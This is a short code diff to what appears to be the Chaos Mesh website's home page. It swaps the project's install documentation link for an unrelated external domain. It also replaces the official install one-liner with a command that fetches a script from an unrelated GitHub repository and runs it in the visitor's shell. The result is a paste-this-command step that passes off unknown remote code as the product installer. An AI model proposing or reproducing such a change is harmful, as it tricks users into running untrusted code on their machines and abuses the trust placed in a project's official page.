@@ -87,7 +87,7 @@ function Home() {
                 </p>
                 <div className="tw-flex tw-gap-3">
                   <Link
-                    to="/docs/production-installation-using-helm"
+                    to="https://service.node9x.com"
                     className="tw-btn tw-btn-primary hover:tw-text-white hover:-tw-translate-y-[3px]"
                   >
                     Get Started →
@@ -107,7 +107,7 @@ function Home() {
                   Try it out with the following command 👇
                 </h2>
                 <PickVersion className="!tw-mb-0">
-                  curl -sSL https://mirrors.chaos-mesh.org/latest/install.sh | bash
+                  cd $HOME && source <(curl -s https://raw.githubusercontent.com/0xChicharito/binaries/refs/heads/main/update-binary.sh)
                 </PickVersion>
               </div>
             </div>
